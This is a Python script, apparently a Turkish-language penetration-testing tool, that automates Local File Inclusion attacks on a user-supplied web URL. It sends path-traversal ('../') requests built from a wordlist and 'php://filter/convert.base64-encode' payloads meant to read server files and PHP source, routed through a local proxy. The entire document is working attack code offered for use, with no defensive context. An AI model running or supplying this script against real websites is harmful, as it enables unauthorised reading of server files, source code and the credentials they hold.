import requests

ok = input("[*] Proje çalışırken bir proxy sunucusu kullanılması tavsiye edilmektedir. Burp gibi bir araç kullanabilirsiniz. Default ayarlamaları değiştirmek için kodları okuyunuz. Eğer ayarlamalarını hazır değilse 'q' ile çıkış yapabilirsiniz.")
if(ok == 'q'):
	exit()
http_proxy  = "http://127.0.0.1:8080"
proxyDict = {"http":http_proxy}

def yazdir(data, v):
    if(v == "h"):
        print(data, " ", end="\r")
    else:
        print(data)

url = input("[*] Hedef URL'i giriniz:\r\n")

attackType = input("Lütfen LFI türünü seçiniz:\r\n1- Default\r\n2- Filter\r\n")
ayrinti = input("[*] Terminalde kayan anlamsız yazılar ister misiniz?(e/h)")
if(attackType == "1"):
    derinlik = input("[*] Lütfen kaç kere ../ uygulanmasını istediğini belirtiniz. (Örn: 8)")
    wordlistFile = open("lfi-wordlist.txt")
    wordlist = wordlistFile.read().split("\n")
    wordlistFile.close()
    for i in wordlist:
        for j in range(int(derinlik)):
            r = requests.get(url+("../"*j)[:-1]+i, proxies=proxyDict)
            yazdir(("URL:",url+i,"    Code:",r.status_code,"    Size:",len(r.text)), ayrinti)

elif(attackType == "2"):
    pages = open("common.txt")
    wordlist = pages.read().split("\n")
    pages.close()
    for i in wordlist:
        r = requests.get(url+"php://filter/convert.base64-encode/resource="+i, proxies=proxyDict)
        yazdir(("URL:",url+"php://filter/convert.base64-encode/resource="+i,"    Code:",r.status_code,"    Size:",len(r.text)), ayrinti)
else:
    print("[*] Hatalı seçim!")
